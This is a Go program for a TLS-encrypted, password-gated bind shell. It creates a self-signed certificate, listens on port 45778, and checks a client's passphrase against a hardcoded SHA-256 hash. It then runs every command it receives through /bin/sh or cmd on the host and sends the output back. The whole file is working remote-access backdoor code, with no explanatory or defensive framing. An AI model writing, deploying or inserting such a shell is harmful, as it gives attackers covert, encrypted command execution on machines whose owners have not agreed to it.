package main

import (
	"bufio"
	"crypto/rand"
	"crypto/rsa"
	"crypto/sha256"
	"crypto/tls"
	"crypto/x509"
	"crypto/x509/pkix"
	"encoding/hex"
	"fmt"
	"math/big"
	"net"
	"os"
	"os/exec"
	"runtime"
	"strings"
	"time"
)

func hash(c string) string {
	hash := sha256.Sum256([]byte(c))
	hashHex := hex.EncodeToString(hash[:])
	return hashHex
}

func generateSelfSignedCert() (*tls.Certificate, error) {
	priv, err := rsa.GenerateKey(rand.Reader, 2048)
	if err != nil {
		return nil, err
	}

	serialNumber, err := rand.Int(rand.Reader, big.NewInt(1000000))
	if err != nil {
		return nil, err
	}

	notBefore := time.Now()
	notAfter := notBefore.Add(365 * 24 * time.Hour)

	template := x509.Certificate{
		SerialNumber: serialNumber,
		Subject:      pkix.Name{Organization: []string{"Self-Signed Go TLS Certificate"}},
		NotBefore:    notBefore,
		NotAfter:     notAfter,
		KeyUsage:     x509.KeyUsageKeyEncipherment | x509.KeyUsageDigitalSignature,
		ExtKeyUsage:  []x509.ExtKeyUsage{x509.ExtKeyUsageServerAuth},
	}

	certDER, err := x509.CreateCertificate(rand.Reader, &template, &template, &priv.PublicKey, priv)
	if err != nil {
		return nil, err
	}

	cert, err := x509.ParseCertificate(certDER)
	if err != nil {
		return nil, err
	}

	tlsCert := &tls.Certificate{
		Certificate: [][]byte{cert.Raw},
		PrivateKey:  priv,
	}
	return tlsCert, nil
}

func main() {
	cert, err := generateSelfSignedCert()
	if err != nil {
		fmt.Println("Failed to generate certificates: ", err)
		return
	}

	config := &tls.Config{
		Certificates: []tls.Certificate{*cert},
	}

	// Set TCP listening port here
	listener, err := tls.Listen("tcp", ":45778", config)
	if err != nil {
		fmt.Println("Failed to create bind shell: ", err)
		return
	}

	fmt.Println("Started!")
	for {
		conn, err := listener.Accept()
		if err != nil {
			fmt.Println("Error accepting connection: ", err)
			continue
		}
		fmt.Println("Connection established from:", conn.RemoteAddr())
		go handleConn(conn)
	}
}

func handleConn(conn net.Conn) {
	defer conn.Close()
	reader := bufio.NewReader(conn)
	if !authenticate(reader) {
		conn.Write([]byte("Nope!\n"))
		return
	}
	shellSession(conn, reader)
}

func authenticate(reader *bufio.Reader) bool {
	h, _ := reader.ReadString('\n')
	h = strings.TrimSpace(h)
	return hash(h) == "ec9e4936d1faa60976a11cc2fdf6cd8dba9fd5353a68e95e431f07e7d5bff518"
}

func shellSession(conn net.Conn, reader *bufio.Reader) {
	cwd, _ := os.Getwd()
	for {
		conn.Write([]byte(cwd + "> "))
		cmd, err := reader.ReadString('\n')
		if err != nil {
			return
		}
		cmd = strings.TrimSpace(cmd)
		if cmd == "exit" {
			return
		}
		if strings.HasPrefix(cmd, "cd ") {
			path := strings.TrimSpace(strings.TrimPrefix(cmd, "cd "))
			if err := os.Chdir(path); err != nil {
				conn.Write([]byte("Error changing directory: " + err.Error() + "\n"))
			} else {
				cwd, _ = os.Getwd()
			}
			continue
		}
		output, err := executeCommand(cmd)
		if err != nil {
			conn.Write([]byte("Error executing command: " + err.Error() + "\n"))
		} else {
			conn.Write(output)
		}
	}
}

func executeCommand(cmd string) ([]byte, error) {
	var shell, flag string
	if runtime.GOOS == "windows" {
		shell = "cmd"
		flag = "/C"
	} else {
		shell = "/bin/sh"
		flag = "-c"
	}
	command := exec.Command(shell, flag, cmd)
	return command.CombinedOutput()
}
